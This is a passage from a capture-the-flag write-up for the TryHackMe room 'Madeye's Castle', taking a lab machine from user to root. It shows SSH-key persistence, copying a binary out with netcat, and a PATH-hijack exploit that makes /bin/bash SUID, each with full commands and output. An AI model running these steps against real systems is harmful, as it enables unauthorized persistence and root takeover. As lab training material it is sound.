![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213041322.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213041336.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213041352.png)

```
$ clear

$ whoami;hostname;id;ip a
hermonine
hogwartz-castle
uid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:1e:89:ee:21:37 brd ff:ff:ff:ff:ff:ff
    inet 10.10.108.236/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1969sec preferred_lft 1969sec
    inet6 fe80::1e:89ff:feee:2137/64 scope link 
       valid_lft forever preferred_lft forever
$
```

I'm user `hermonine`!

**However, I don't like `sh` shell, so let's spawn a `bash` shell:**
```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
bash: /home/harry/.bashrc: Permission denied
hermonine@hogwartz-castle:~$
```

Much better!

**Let's check out `hermonine` home directory!**
```
hermonine@hogwartz-castle:~$ cd /home/hermonine

hermonine@hogwartz-castle:/home/hermonine$ ls -lah
total 40K
drwxr-x--- 5 hermonine hermonine 4.0K Nov 26  2020 .
drwxr-xr-x 4 root      root      4.0K Nov 26  2020 ..
lrwxrwxrwx 1 root      root         9 Nov 26  2020 .bash_history -> /dev/null
-rw-r----- 1 hermonine hermonine  220 Apr  4  2018 .bash_logout
-rw-r----- 1 hermonine hermonine 3.7K Apr  4  2018 .bashrc
drwx------ 2 hermonine hermonine 4.0K Nov 26  2020 .cache
drwx------ 3 hermonine hermonine 4.0K Nov 26  2020 .gnupg
-rw-r----- 1 hermonine hermonine  807 Apr  4  2018 .profile
-rw------- 1 hermonine hermonine   36 Nov 26  2020 .python_history
drwxr-x--- 2 hermonine hermonine 4.0K Nov 26  2020 .ssh
-rw-r----- 1 hermonine hermonine   45 Nov 26  2020 user2.txt
```

**Oh! `hermonine` has a `.ssh` directory, let's see if it has a private SSH key or not:**
```
hermonine@hogwartz-castle:/home/hermonine$ ls -lah .ssh
total 8.0K
drwxr-x--- 2 hermonine hermonine 4.0K Nov 26  2020 .
drwxr-x--- 5 hermonine hermonine 4.0K Nov 26  2020 ..
```

It's empty. Nevermind, we can **add our own public SSH key!**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# mkdir .ssh;cd .ssh

┌──(root🌸siunam)-[~/…/thm/ctf/Madeye's_Castle/.ssh]
└─# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/ctf/thm/ctf/Madeye's_Castle/.ssh/hermonine
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/ctf/thm/ctf/Madeye's_Castle/.ssh/hermonine
Your public key has been saved in /root/ctf/thm/ctf/Madeye's_Castle/.ssh/hermonine.pub
[...]

┌──(root🌸siunam)-[~/…/thm/ctf/Madeye's_Castle/.ssh]
└─# cat hermonine.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCz54thCvEMQgAlOEQqthXYdVBF90AVeJ4je3DW0vTO9n5MubiFgRpjAEAYBPByui4De1YE017WbHliklvI53N4XfQ0KfvKXS8r1bXtfTU394zY2qUl9f6OIK79HFRVH9KXS9Q7Auw60s56NeuJ/UC3S4TJA/a3D/YOmPTKBJEP/J1sIvbHkJGpvTbY56RGwC7g6dBFshv8irjXMkBSHlSVTfKv7l6JWNaGAaFaD2ZiO6f3tGkiA+e4gB4xbHZz9Cypj/0SPo/wmyBEtIe2/VMoHRTUICQ7BON1ul81nyD+LLlRkilkRoA2ti/So6w63g6gkN5upAhORKQ4b5uBzJsRFylGTlpNh4D5jSalIqrb5fbNm1AeOOQIpJkijREpsK2bs2ThP8ZtPT0vsCkRasJq5z/dUNGnok3ib24spmuCF5feclPfVVS/mfbPWku+fb8Z6O/jcPkokBsRBT8863cawB6m6uFPTGYwmcSA45kniY8biCBi/YXSM3s4aI9eJyc= root@siunam
```

```
hermonine@hogwartz-castle:/home/hermonine$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCz54thCvEMQgAlOEQqthXYdVBF90AVeJ4je3DW0vTO9n5MubiFgRpjAEAYBPByui4De1YE017WbHliklvI53N4XfQ0KfvKXS8r1bXtfTU394zY2qUl9f6OIK79HFRVH9KXS9Q7Auw60s56NeuJ/UC3S4TJA/a3D/YOmPTKBJEP/J1sIvbHkJGpvTbY56RGwC7g6dBFshv8irjXMkBSHlSVTfKv7l6JWNaGAaFaD2ZiO6f3tGkiA+e4gB4xbHZz9Cypj/0SPo/wmyBEtIe2/VMoHRTUICQ7BON1ul81nyD+LLlRkilkRoA2ti/So6w63g6gkN5upAhORKQ4b5uBzJsRFylGTlpNh4D5jSalIqrb5fbNm1AeOOQIpJkijREpsK2bs2ThP8ZtPT0vsCkRasJq5z/dUNGnok3ib24spmuCF5feclPfVVS/mfbPWku+fb8Z6O/jcPkokBsRBT8863cawB6m6uFPTGYwmcSA45kniY8biCBi/YXSM3s4aI9eJyc= root@siunam" > /home/hermonine/.ssh/authorized_keys
```

**Now we can SSH into user `hermonine`!**
```
┌──(root🌸siunam)-[~/…/thm/ctf/Madeye's_Castle/.ssh]
└─# ssh -i hermonine hermonine@$RHOSTS
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/

Last login: Thu Nov 26 01:29:01 2020 from 192.168.56.1
hermonine@hogwartz-castle:~$ whoami;hostname;id;ip a
hermonine
hogwartz-castle
uid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:1e:89:ee:21:37 brd ff:ff:ff:ff:ff:ff
    inet 10.10.108.236/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3307sec preferred_lft 3307sec
    inet6 fe80::1e:89ff:feee:2137/64 scope link 
       valid_lft forever preferred_lft forever
```

**user2.txt:**
```
hermonine@hogwartz-castle:~$ cat user2.txt
RME{Redacted}
```

### hermonine to root

**Now, let's take a step back. We've found a weird SUID binary: `/srv/time-turner/swagger`.**

**Let's use `strings` to list all the strings inside it!**
```
hermonine@hogwartz-castle:~$ strings /srv/time-turner/swagger
[...]
time
[...]
Nice use of the time-turner!
This system architecture is 
uname -p
Guess my number: 
Nope, that is not what I was thinking
I was thinking of %d
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
swagger.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
impressive
[...]
```

**Take a note at the `uname -p`, which is using relative path.**

**How about we run that binary?**
```
hermonine@hogwartz-castle:~$ /srv/time-turner/swagger
Guess my number: 1337
Nope, that is not what I was thinking
I was thinking of 244141216
```

**Hmm... Let's transfer that binary to do some reverse engineering:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# nc -lnvp 1337 > swagger
listening on [any] 1337 ...
```

```
hermonine@hogwartz-castle:/srv/time-turner$ nc -n 10.9.0.253 1337 < swagger
```

**To do so, I'll use Ghidra:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Madeye's_Castle]
└─# ghidra
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Madeyes-Castle/images/Pasted%20image%2020221213045032.png)

**Let's check the `main()` function:**
```c
undefined8 main(void)

{
  time_t tVar1;
  long in_FS_OFFSET;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_14 = rand();
  printf("Guess my number: ");
  __isoc99_scanf(&DAT_00100b8d,&local_18);
  if (local_14 == local_18) {
    impressive();
  }
  else {
    puts("Nope, that is not what I was thinking");
    printf("I was thinking of %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

**As we can see, the `local_14` variable is using a random number (`rand()`).**

**If `local_14` equals to `local_18`, it calls function `impressive()`:**
```c
void impressive(void)

{
  setregid(0,0);
  setreuid(0,0);
  puts("Nice use of the time-turner!");
  printf("This system architecture is ");
  fflush(stdout);
  system("uname -p");
  return;
}
```

**Which is executing `uname -p` as root!**

But how do we pass the check?

**After some googleing, I found that it might vulnerable to [timing attack](https://en.wikipedia.org/wiki/Timing_attack)!**

**Let's try to run that binary at the very same time:**
```
hermonine@hogwartz-castle:/srv/time-turner$ for number in {1..5};do echo $number | /srv/time-turner/swagger; done
Guess my number: Nope, that is not what I was thinking
I was thinking of 1472811415
Guess my number: Nope, that is not what I was thinking
I was thinking of 1472811415
Guess my number: Nope, that is not what I was thinking
I was thinking of 1472811415
Guess my number: Nope, that is not what I was thinking
I was thinking of 1472811415
Guess my number: Nope, that is not what I was thinking
I was thinking of 1472811415
```

**It's not random!**

**Now, what if I run that binary once to leak the correct number, and then I use that number to pass the check??**
```
hermonine@hogwartz-castle:/srv/time-turner$ echo "number pls" | /srv/time-turner/swagger | grep -oE "[0-9]+" | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```

We did it!

**What we're doing is leaking the correct number, and then using regular expression to only grab those numbers, finally pipe it to `/srv/time-turner/swagger` again!**

Now, let's take a step back.

**We've found that after passing the check, it'll execute `uname -p`, which is exploitable!!**

**To exploit relative path, I'll:**

- Export a new `path` environment variable:

```
hermonine@hogwartz-castle:/srv/time-turner$ cd /tmp
hermonine@hogwartz-castle:/tmp$ export PATH=/tmp:$PATH
```

- Create a fake `uname` script that adds SUID sticky bit to `/bin/bash`:

```
hermonine@hogwartz-castle:/tmp$ echo "chmod +s /bin/bash" > uname
hermonine@hogwartz-castle:/tmp$ chmod +x uname
```

- Run the payload again:

```
hermonine@hogwartz-castle:/tmp$ echo "number pls" | /srv/time-turner/swagger | grep -oE "[0-9]+" | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```

- Verify the has SUID sticky bit or not:

```
hermonine@hogwartz-castle:/tmp$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

**Nice!!! We now can becoming `root` via `/bin/bash -p` to use the SUID privilege in `bash`!**
```
hermonine@hogwartz-castle:/tmp$ /bin/bash -p
bash-4.4# whoami;hostname;id;ip a
root
hogwartz-castle
uid=1002(hermonine) gid=1002(hermonine) euid=0(root) egid=0(root) groups=0(root),1002(hermonine)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:1e:89:ee:21:37 brd ff:ff:ff:ff:ff:ff
    inet 10.10.108.236/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2201sec preferred_lft 2201sec
    inet6 fe80::1e:89ff:feee:2137/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
bash-4.4# cat /root/root.txt 
RME{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating SMB Shares
2. Enumerating VHost(Virtual Hosting)
3. Enumerating Hidden Directories & Files
4. Authenication Bypass Via SQL Injection
5. Exploiting & Extracting Sensitive Data via Error-Based SQL injection
6. Cracking Password Hash
7. Horizontal Privilege Escalation via Misconfigured Sudo Permission
8. Vertical Privilege Escalation via Timing Attack in a SUID Binary